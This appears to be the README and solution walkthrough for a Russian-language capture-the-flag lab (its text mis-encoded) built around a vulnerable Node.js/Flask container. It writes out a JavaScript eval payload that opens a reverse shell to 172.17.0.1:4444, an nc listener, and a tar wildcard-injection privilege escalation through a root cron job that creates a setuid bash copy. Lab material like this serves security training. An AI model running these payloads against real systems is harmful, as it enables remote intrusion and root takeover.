# üõ°Ô∏è CTF: JavaScript Eval –∏ –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è cron + tar (Wildcard Injection)

## üì¶ –ó–∞–ø—É—Å–∫

–î–ª—è –∑–∞–ø—É—Å–∫–∞ –∑–∞–¥–∞–Ω–∏—è –≤–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å `startup.sh`:

```bash
chmod +x startup.sh
./startup.sh
```

–ë—É–¥–µ—Ç –∑–∞–ø—É—â–µ–Ω –æ–¥–∏–Ω –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä `safe-eval-container` —Å —É—è–∑–≤–∏–º—ã–º Node.js/Flask –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ–º –∏ –∞–∫—Ç–∏–≤–Ω—ã–º cron-–ø—Ä–æ—Ü–µ—Å—Å–æ–º.

---

## üï≥Ô∏è –†–µ–∞–ª–∏–∑–æ–≤–∞–Ω–Ω—ã–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

### 1. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ–≥–æ `eval` –≤ Node.js

**–û–ø–∏—Å–∞–Ω–∏–µ:**  
–í–æ Flask-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –ø–µ—Ä–µ–¥–∞—ë—Ç—Å—è –∫–∞–∫ –∞—Ä–≥—É–º–µ–Ω—Ç –≤ `node -e`, –≥–¥–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ `eval()`. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∞—Ç–∞–∫—É—é—â–µ–º—É –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ JavaScript-–∫–æ–º–∞–Ω–¥—ã.

**–ö–∞–∫ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å:**

–ü—Ä–∏–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥–Ω–æ–π –æ–±–æ–ª–æ—á–∫–∏ (Reverse Shell):

```javascript
require('child_process').execSync('bash -c "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"')
```

‚ö†Ô∏è –ü–µ—Ä–µ–¥ —ç—Ç–∏–º –∑–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏–µ –Ω–∞ —Ö–æ—Å—Ç–µ:

```bash
nc -lvnp 4444
```

---

### 2. –•—Ä–∞–Ω–µ–Ω–∏–µ —Å–µ–∫—Ä–µ—Ç–æ–≤ –∏ —Ñ–ª–∞–≥–æ–≤ –≤ —Å–∏—Å—Ç–µ–º–µ

–ü–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è shell –æ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `webuser` –º–æ–∂–Ω–æ –Ω–∞–π—Ç–∏:

- `/home/webuser/user.txt` ‚Äî –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π —Ñ–ª–∞–≥.  
- `/opt/app/readme.txt` ‚Äî –ø–æ–¥—Å–∫–∞–∑–∫–∞ –∫ —Å–ª–µ–¥—É—é—â–µ–º—É —ç—Ç–∞–ø—É.

–ü—Ä–∏–º–µ—Ä:

```bash
cat user.txt
cat /opt/app/readme.txt
```

---

### 3. Wildcard Injection —á–µ—Ä–µ–∑ `tar` –≤ `cron`

**–û–ø–∏—Å–∞–Ω–∏–µ:**  
–í —Å–∏—Å—Ç–µ–º–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω cron, –∫–æ—Ç–æ—Ä—ã–π –µ–∂–µ–º–∏–Ω—É—Ç–Ω–æ –∞—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ `/var/logs/` —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã:

```bash
tar -czf /backup/logs-<timestamp>.tar *
```

–≠—Ç–æ –¥–µ–ª–∞–µ—Ç –≤–æ–∑–º–æ–∂–Ω—ã–º —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—é wildcard-–∏–Ω—ä–µ–∫—Ü–∏–∏, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π —Å—Ä–∞–±–∞—Ç—ã–≤–∞—é—Ç —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–µ —Ñ–∞–π–ª—ã-–ø–∞—Ä–∞–∑–∏—Ç—ã —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º `--`.

**–ö–∞–∫ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å:**

1. –ü–æ–ª—É—á–∏–≤ shell, –ø–µ—Ä–µ–π–¥–∏—Ç–µ –≤ `/var/logs/`:

    ```bash
    cd /var/logs/
    ```

2. –°–æ–∑–¥–∞–π—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ —Ñ–∞–π–ª—ã:

    ```bash
    echo "" > "--checkpoint-action=exec=sh shell.sh"
    echo "" > "--checkpoint=1"
    ```

3. –°–æ–∑–¥–∞–π—Ç–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π `shell.sh`, –Ω–∞–ø—Ä–∏–º–µ—Ä:

    ```bash
    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
    ```

4. –°–¥–µ–ª–∞–π—Ç–µ –µ–≥–æ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º:

    ```bash
    chmod +x shell.sh
    ```

–ß–µ—Ä–µ–∑ –º–∏–Ω—É—Ç—É `cron` –≤—ã–ø–æ–ª–Ω–∏—Ç `tar` —Å wildcard –∏ –∑–∞–ø—É—Å—Ç–∏—Ç `shell.sh` –æ—Ç –∏–º–µ–Ω–∏ `root`.

5. –ü–æ–ª—É—á–∏—Ç–µ root shell:

    ```bash
    /tmp/rootbash -p
    ```

6. –ü–æ–ª—É—á–∏—Ç–µ —Ñ–ª–∞–≥:

    ```bash
    cat /root/root.txt
    ```

---

## ‚úÖ –§–ª–∞–≥–∏

- `user.txt` ‚Äî –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è `webuser`.  
- `root.txt` ‚Äî –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ `/root`, –¥–æ—Å—Ç—É–ø–µ–Ω —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π —ç—Å–∫–∞–ª–∞—Ü–∏–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π.
